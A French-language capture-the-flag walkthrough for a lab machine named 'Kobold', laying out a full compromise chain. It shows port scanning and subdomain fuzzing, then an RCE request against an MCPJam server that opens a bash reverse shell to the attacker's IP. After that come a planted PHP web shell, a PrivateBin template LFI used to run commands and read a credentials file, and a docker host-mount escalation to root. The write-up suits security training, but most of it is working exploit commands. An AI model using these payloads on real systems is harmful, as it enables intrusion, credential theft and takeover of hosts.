# Kobold

	echo "10.129.19.130 kobold.htb" >> /etc/hosts
    echo "10.129.19.130 mcp.kobold.htb" >> /etc/hosts
    echo "10.129.19.130 bin.kobold.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.129.19.130 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.129.19.130 -oN nmap.txt
	
Résultats :

    PORT    STATE SERVICE  REASON  VERSION
    22/tcp  open  ssh      syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
    80/tcp  open  http     syn-ack nginx 1.24.0 (Ubuntu)
    443/tcp open  ssl/http syn-ack nginx 1.24.0 (Ubuntu)
    3552/tcp open  taserver? syn-ack

Fuzzing : 

    ffuf -H "Host: FUZZ.kobold.htb" -u https://kobold.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 154
    
On a un sous-domaine mcp.kobold.htb avec un MCPJam qui permet d'ajouter des serveurs.

Un CVE récent existe et permet une RCE : 
- https://nvd.nist.gov/vuln/detail/CVE-2026-23744
- https://github.com/advisories/GHSA-232v-j27c-5pp6

Exploitation : 

```
curl -k -X POST "https://mcp.kobold.htb/api/mcp/connect" \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.16.127/9999 0>&1"],"env":{}},"serverId":"exploit"}'
```

    ncat -nvlp 9999
    cat user.txt

## Deuxième vulnérabilité 

Le fuzzing révèle aussi un sous-domaine bin.kobold.htb, avec un PrivateBin également vulnérable à un CVE permettant une LFI : 
- https://nvd.nist.gov/vuln/detail/CVE-2025-64714 
- https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82


Commande à faire en tant que Ben : 

    echo '<?php system($_GET["cmd"]); ?>' > /privatebin-data/data/shell.php
    
Exploitation côté PrivateBin : 

```
curl -sk "https://bin.kobold.htb/" -H "Cookie: template=../data/shell" --get --data-urlencode "cmd=id"
```

Récupération du fichier de configuration qui contient le mot de passe du compte Arcane : 

```
curl -sk "https://bin.kobold.htb/" -H "Cookie: template=../data/shell" --get --data-urlencode "cmd=cat /srv/cfg/conf.php"
```

## Élévation de privilèges

Le compte récupéré permet de se connecter sur l'interface Arcane http://mcp.kobold.htb:3552 servant à gérer des containers. 

On peut créer un container malicieux en reprenant l'image privatebin/nginx-fpm-alpine:2.0.2 du premier et lui associer une commande /bin/sh par exemple.

Fin de l'exploitation depuis Ben : 

    newgrp docker
    docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
